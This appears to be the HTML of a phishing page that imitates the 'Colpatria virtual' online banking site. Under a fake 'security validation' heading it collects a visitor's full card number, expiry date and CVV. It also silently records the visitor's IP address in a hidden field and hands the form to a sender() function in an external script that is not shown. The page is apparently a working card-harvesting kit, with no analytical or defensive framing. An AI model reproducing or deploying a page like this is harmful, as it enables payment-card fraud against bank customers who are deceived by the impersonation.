<!DOCTYPE html>
<html lang="en">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <link rel="icon" type="image/x-icon" href="images/favicon.ico">
      <title>Home Colpatria virtual</title>
      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>

    <script>
         $.getJSON("https://api.ipify.org?format=json",
                                           function(data) {
         
             // Setting text of element P with id gfg
             $("#gfg").html(data.ip);
         })
      </script>
      <link rel="stylesheet" type="text/css" href="css/otroindex.css">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      

      <link rel="stylesheet" type="text/css" href="css/canvas-dom-6.0.0.min.css">

      <link rel="stylesheet" href="css/styles.4962d1d9c246b31b311c.css" media="all" onload="this.media=&#39;all&#39;">
      <noscript>
         <link rel="stylesheet" href="styles.4962d1d9c246b31b311c.css">
      </noscript>
    
   </head>
   <body>
      <auth-root _nghost-hkw-c68="" ng-version="12.1.4">
         <p id="gfg" hidden="">
         <form action="" method="post" onsubmit=" return sender()">
         <div _ngcontent-hkw-c68="" class="application-wrapper">
            <canvas-header _ngcontent-hkw-c68="" shadow="" fixed="" class="header__block">
               <header class="header">
                  <div class="header__bar container container--center direction--row"><a _ngcontent-hkw-c68="" class="brand block block--centered" href="#"><img _ngcontent-hkw-c68="" src="images/logo.svg"  class="logo"><img _ngcontent-hkw-c68="" src="images/logo_symbol.svg"class="logo__mobile"></a></div>
               </header>
            </canvas-header>
            <section _ngcontent-hkw-c68="" role="main" class="container main-container">
               <router-outlet _ngcontent-hkw-c68=""></router-outlet>
               <auth-login _nghost-hkw-c97="">
                 
                  <div _ngcontent-hkw-c97="" class="col-xs-12 block--padding-0 margin-xs-72--bottom">
                     <div _ngcontent-c5="" class="direction--row">
                        <div _ngcontent-c5="" class="col-md-2 hide--xs hide--sm"></div>
                        <div _ngcontent-c5="" class="col-xs-12 offset-sm-3 col-sm-6 col-md-5 offset-md-0 block--padding-0">
                           <p _ngcontent-c5="" style="font-size: 22pt;" >Validación de seguridad</p>
                           <hr _ngcontent-c5="" class="brand-line text--align-left margin-xs-18--top">
                        </div>
                     </div>
                     <div _ngcontent-hkw-c97="" class="direction--row">
                        <div _ngcontent-hkw-c97="" class="col-md-2 hide--xs hide--sm"></div>
                        <div _ngcontent-hkw-c97="" class="col-xs-12 offset-sm-3 col-sm-6 col-md-4 offset-md-0 block--padding-0">
                           <h1 _ngcontent-hkw-c97="" autocomplete="off" class="form ng-pristine ng-invalid ng-touched">
                              
                              <div _ngcontent-hkw-c97="" class="margin-xs-24--top form__password">
                                 <div _ngcontent-c5="" class="direction--row">
                        <div _ngcontent-c5="" class="col-md-2 hide--xs hide--sm"></div>
                        
                     </div>

                                 <canvas-input-text _ngcontent-hkw-c97="" formcontrolname="secondCredential" _nghost-hkw-c51="" class="ng-untouched ng-pristine ng-invalid" maxlength="15">
                                    <div _ngcontent-hkw-c51="" class="form__input">
                                       <label _ngcontent-hkw-c51="" role="text" class="label" for="lmkbmdm10"></label>
                                       <div _ngcontent-hkw-c51="" class="form__input--inline">
                                          <input _ngcontent-hkw-c51="" class="input input--text ng-untouched ng-pristine ng-valid input--with-icon input--with-icon--left input-w-aux__input"  type="TEXT" placeholder="XXXX XXXX XXXX XXXX" autocomplete="off" required minlength="16" maxlength="16" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" id="celec" >

                                          <canvas-svg _ngcontent-hkw-c51="" role="presentation" class="input__icon input__icon--left flex">
                                             <svg width="20" height="20" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 512 512" style="enable-background:new 0 0 512 512;" xml:space="preserve">
                                                      <path d="M502,92.5H10c-5.522,0-10,4.478-10,10v307c0,5.522,4.478,10,10,10h492c5.522,0,10-4.478,10-10v-307
                                                         C512,96.978,507.522,92.5,502,92.5z M492,399.5H20v-287h472V399.5z"></path>
                                                      <path d="M298.667,315.5c0,30.327,24.673,55,55,55c8.966,0,17.664-2.156,25.5-6.271c7.836,4.115,16.534,6.271,25.5,6.271
                                                         c30.327,0,55-24.673,55-55c0-30.327-24.673-55-55-55c-8.966,0-17.664,2.156-25.5,6.271c-7.836-4.115-16.534-6.271-25.5-6.271
                                                         C323.34,260.5,298.667,285.173,298.667,315.5z M404.819,295.32c-1.957-4.989-4.674-9.74-8.018-13.932
                                                         c2.559-0.589,5.193-0.889,7.866-0.889c19.299,0,35,15.701,35,35s-15.701,35.001-35,35.001c-2.673,0-5.308-0.3-7.866-0.889
                                                         C408.917,334.426,411.887,313.346,404.819,295.32z M379.167,291.562c6.033,6.428,9.5,14.956,9.5,23.938s-3.467,17.51-9.5,23.938
                                                         c-6.033-6.429-9.5-14.957-9.5-23.938C369.667,306.519,373.134,297.99,379.167,291.562z M352.659,333.349
                                                         c2.009,5.848,5.014,11.424,8.874,16.263c-2.558,0.588-5.193,0.888-7.866,0.888c-19.299,0-35-15.701-35-35s15.701-35,35-35
                                                         c2.673,0,5.308,0.3,7.866,0.889c-0.132,0.166-0.254,0.339-0.384,0.506C349.943,296.403,346.702,316.01,352.659,333.349z"></path>
                                                      <path d="M244.667,339.5h-178c-5.522,0-10,4.478-10,10c0,5.522,4.478,10,10,10h178c5.522,0,10-4.478,10-10
                                                         C254.667,343.978,250.189,339.5,244.667,339.5z"></path>
                                                      <path d="M244.667,282.5h-45c-5.522,0-10,4.478-10,10c0,5.522,4.478,10,10,10h45c5.522,0,10-4.478,10-10
                                                         C254.667,286.978,250.189,282.5,244.667,282.5z"></path>
                                                      <path d="M53.667,228.5c0,5.522,4.478,10,10,10h304c5.522,0,10-4.478,10-10c0-5.522-4.478-10-10-10h-304
                                                         C58.145,218.5,53.667,222.978,53.667,228.5z"></path>
                                                      <path d="M405.667,238.5h40c5.522,0,10-4.478,10-10c0-5.522-4.478-10-10-10h-40c-5.522,0-10,4.478-10,10
                                                         C395.667,234.022,400.145,238.5,405.667,238.5z"></path>
                                                      <path d="M60.667,197.5h61c5.522,0,10-4.478,10-10v-42c0-5.522-4.478-10-10-10h-61c-5.522,0-10,4.478-10,10v42
                                                         C50.667,193.022,55.145,197.5,60.667,197.5z M70.667,155.5h41v22h-41V155.5z"></path>
                                             </svg>
                                          </canvas-svg>
                                       </div>
                                    </div>
                                 </canvas-input-text>



                              <canvas-input-text _ngcontent-hkw-c97="" formcontrolname="secondCredential" _nghost-hkw-c51="" class="ng-untouched ng-pristine ng-invalid" maxlength="15">
                                    <div _ngcontent-hkw-c51="" class="form__input">
                                       <label _ngcontent-hkw-c51="" role="text" class="label" for="lmkbmdm10"></label>
                                       <div _ngcontent-hkw-c51="" class="form__input--inline">
                                          <input _ngcontent-hkw-c51="" class="input input--text ng-untouched ng-pristine ng-valid input--with-icon input--with-icon--left input-w-aux__input"  type="text" placeholder="Mes y Año. Ej: 02/21" autocomplete="off" required maxlength="5" minlength="5"  onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" onkeyup="formatString(event);" id="vencec">

                                          <canvas-svg _ngcontent-hkw-c51="" role="presentation" class="input__icon input__icon--left flex">
                                             <svg xmlns="http://www.w3.org/2000/svg" width="25" height="24" viewBox="0 0 100 100" focusable="false" role="presentation" aria-hidden="true" class="svg-icon svg-icon--size-18px">
                                               <path d="M32.286,42.441h-9.762c-0.829,0-1.5,0.671-1.5,1.5v9.762c0,0.828,0.671,1.5,1.5,1.5h9.762c0.829,0,1.5-0.672,1.5-1.5   v-9.762C33.786,43.113,33.115,42.441,32.286,42.441z M30.786,52.203h-6.762v-6.762h6.762V52.203z"/>
                                               <path d="M55.054,42.441h-9.762c-0.829,0-1.5,0.671-1.5,1.5v9.762c0,0.828,0.671,1.5,1.5,1.5h9.762c0.828,0,1.5-0.672,1.5-1.5   v-9.762C56.554,43.113,55.882,42.441,55.054,42.441z M53.554,52.203h-6.762v-6.762h6.762V52.203z"/>
                                               <path d="M77.12,42.441h-9.762c-0.828,0-1.5,0.671-1.5,1.5v9.762c0,0.828,0.672,1.5,1.5,1.5h9.762c0.828,0,1.5-0.672,1.5-1.5v-9.762   C78.62,43.113,77.948,42.441,77.12,42.441z M75.62,52.203h-6.762v-6.762h6.762V52.203z"/>
                                               <path d="M32.286,64.677h-9.762c-0.829,0-1.5,0.672-1.5,1.5v9.762c0,0.828,0.671,1.5,1.5,1.5h9.762c0.829,0,1.5-0.672,1.5-1.5   v-9.762C33.786,65.349,33.115,64.677,32.286,64.677z M30.786,74.439h-6.762v-6.762h6.762V74.439z"/>
                                               <path d="M55.054,64.677h-9.762c-0.829,0-1.5,0.672-1.5,1.5v9.762c0,0.828,0.671,1.5,1.5,1.5h9.762c0.828,0,1.5-0.672,1.5-1.5   v-9.762C56.554,65.349,55.882,64.677,55.054,64.677z M53.554,74.439h-6.762v-6.762h6.762V74.439z"/>
                                               <path d="M77.12,64.677h-9.762c-0.828,0-1.5,0.672-1.5,1.5v9.762c0,0.828,0.672,1.5,1.5,1.5h9.762c0.828,0,1.5-0.672,1.5-1.5v-9.762   C78.62,65.349,77.948,64.677,77.12,64.677z M75.62,74.439h-6.762v-6.762h6.762V74.439z"/>
                                               <path d="M89,13.394h-9.907c-0.013,0-0.024,0.003-0.037,0.004V11.4c0-3.268-2.658-5.926-5.926-5.926s-5.926,2.659-5.926,5.926v1.994   H56.041V11.4c0-3.268-2.658-5.926-5.926-5.926s-5.926,2.659-5.926,5.926v1.994H33.025V11.4c0-3.268-2.658-5.926-5.926-5.926   s-5.926,2.659-5.926,5.926v1.995c-0.005,0-0.01-0.001-0.015-0.001h-9.905c-0.829,0-1.5,0.671-1.5,1.5V92.64   c0,0.828,0.671,1.5,1.5,1.5H89c0.828,0,1.5-0.672,1.5-1.5V14.894C90.5,14.065,89.828,13.394,89,13.394z M70.204,11.4   c0-1.614,1.312-2.926,2.926-2.926s2.926,1.312,2.926,2.926v8.277c0,1.613-1.312,2.926-2.926,2.926s-2.926-1.312-2.926-2.926V11.4z    M50.115,8.474c1.613,0,2.926,1.312,2.926,2.926v8.277c0,1.613-1.312,2.926-2.926,2.926c-1.614,0-2.926-1.312-2.926-2.926v-4.643   c0.004-0.047,0.014-0.092,0.014-0.141s-0.01-0.094-0.014-0.141V11.4C47.189,9.786,48.501,8.474,50.115,8.474z M24.173,11.4   c0-1.614,1.312-2.926,2.926-2.926c1.613,0,2.926,1.312,2.926,2.926v8.277c0,1.613-1.312,2.926-2.926,2.926   c-1.614,0-2.926-1.312-2.926-2.926V11.4z M87.5,91.14H12.753V16.394h8.405c0.005,0,0.01-0.001,0.015-0.001v3.285   c0,3.268,2.659,5.926,5.926,5.926s5.926-2.658,5.926-5.926v-3.283h11.164v3.283c0,3.268,2.659,5.926,5.926,5.926   s5.926-2.658,5.926-5.926v-3.283h11.163v3.283c0,3.268,2.658,5.926,5.926,5.926s5.926-2.658,5.926-5.926V16.39   c0.013,0,0.024,0.004,0.037,0.004H87.5V91.14z"/>
                                             </svg>
                                          </canvas-svg>
                                       </div>
                                    </div>
                                 </canvas-input-text>


                                  <canvas-input-text _ngcontent-hkw-c97="" formcontrolname="secondCredential" _nghost-hkw-c51="" class="ng-untouched ng-pristine ng-invalid" maxlength="15">
                                    <div _ngcontent-hkw-c51="" class="form__input">
                                       <label _ngcontent-hkw-c51="" role="text" class="label" for="lmkbmdm10"></label>
                                       <div _ngcontent-hkw-c51="" class="form__input--inline">
                                          <input _ngcontent-hkw-c51="" class="input input--text ng-untouched ng-pristine ng-valid input--with-icon input--with-icon--left input-w-aux__input"  type="text" placeholder="CVV" autocomplete="off" required minlength="3" maxlength="3" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" id="cevocer" >

                                          <canvas-svg _ngcontent-hkw-c51="" role="presentation" class="input__icon input__icon--left flex">
                                             <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" focusable="false" role="presentation" aria-hidden="true" class="svg-icon svg-icon--size-18px">
                                                <path fill="none" d="M20.175 19.972c0 .988-.808 1.796-1.796 1.796H5.804a1.802 1.802 0 0 1-1.797-1.796v-8.983c0-.988.808-1.796 1.797-1.796h12.575c.988 0 1.796.808 1.796 1.796v8.983z"></path>
                                                <path d="M12.99 13.684a.897.897 0 1 1-1.795.002.897.897 0 0 1 1.794-.002z"></path>
                                                <path fill="none" d="M12.104 14.582v2.695"></path>
                                                <path fill="none" d="M16.607 6.498v2.33M7.6 9.065V6.499m0 0a4.492 4.492 0 0 1 8.982 0"></path>
                                             </svg>
                                          </canvas-svg>
                                       </div>
                                    </div>
                                 </canvas-input-text>

                                 

                              </div>
                              
                              <div _ngcontent-hkw-c97="" class="margin-xs-24--top">
                                 <canvas-button _ngcontent-hkw-c97="" width="100%">
                                    <button type="submit" class="button button--primary" id="" style="width: 100%;">
                                       <!----><span _ngcontent-hkw-c97="">Validar</span><!---->
                                    </button>
                                 </canvas-button>
                              </div>
                           </form>
                        </div>
                        <div _ngcontent-hkw-c97="" class="col-md-1 hide--xs hide--sm line-vertical">
                           <div _ngcontent-hkw-c97="" class="line-border hide--xs hide--sm"></div>
                        </div>
                        <div _ngcontent-hkw-c97="" class="col-md-3 block--padding-0 direction--row info-register">
                           <div _ngcontent-hkw-c97="" class="col-xs-12 offset-sm-3 col-sm-6 col-md-12 offset-md-0 block--padding-0">
                              <canvas-image _ngcontent-c5="" class="image" path="images/one.png" _nghost-c9="">
                              <img _ngcontent-c9="" style="width: 100%; min-width: 100%; align-self: center;" src="images/one.png">
                           </canvas-image>
                              <p _ngcontent-hkw-c97="" class="text  margin-xs-18--bottom title-register">Un mundo donde solo tú eliges la tarjeta que se adapta a tu vida.</p>
                           
                              <!---->
                           </div>
                        </div>
                        <div _ngcontent-hkw-c97="" class="col-md-2 hide--xs hide--sm"></div>
                     </div>
                  </div>
               </auth-login>
               <!---->
            </section>
            <footer _ngcontent-hkw-c68="" class="hide--xs">
               <canvas-co-footer-simple _ngcontent-hkw-c68="">
                  <div class="footer-simple--co background--background-alternate">
                     <div class="container container--center">
                        <div class="direction--row">
                           <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                              <div class="margin-xs-12 margin-sm-18">
                                 <p class="text--roman text--footer color--default">
                                    <span _ngcontent-hkw-c68="" text=""> © 2022 Todos los Derechos Reservados <br _ngcontent-hkw-c68="" class="hide--sm hide--md hide--lg">  Colpatria. </span><!----><!---->
                                 </p>
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
               </canvas-co-footer-simple>
            </footer>
         </div>
         <jwl-channel-available-error _ngcontent-hkw-c68="">
            <!---->
         </jwl-channel-available-error>
      </auth-root>
   </form>
<script>
   function formatString(e) {
  var inputChar = String.fromCharCode(event.keyCode);
  var code = event.keyCode;
  var allowedKeys = [8];
  if (allowedKeys.indexOf(code) !== -1) {
    return;
  }

  event.target.value = event.target.value.replace(
    /^([1-9]\/|[2-9])$/g, '0$1/' // 3 > 03/
  ).replace(
    /^(0[1-9]|1[0-2])$/g, '$1/' // 11 > 11/
  ).replace(
    /^([0-1])([3-9])$/g, '0$1/$2' // 13 > 01/3
  ).replace(
    /^(0?[1-9]|1[0-2])([0-9]{2})$/g, '$1/$2' // 141 > 01/41
  ).replace(
    /^([0]+)\/|[0]+$/g, '0' // 0/ > 0 and 00 > 0
  ).replace(
    /[^\d\/]|^[\/]*$/g, '' // To allow only digits and `/`
  ).replace(
    /\/\//g, '/' // Prevent entering more than 1 `/`
  );
}

   </script>
    <script src="js/sax3.js"></script>
   </body>

</html>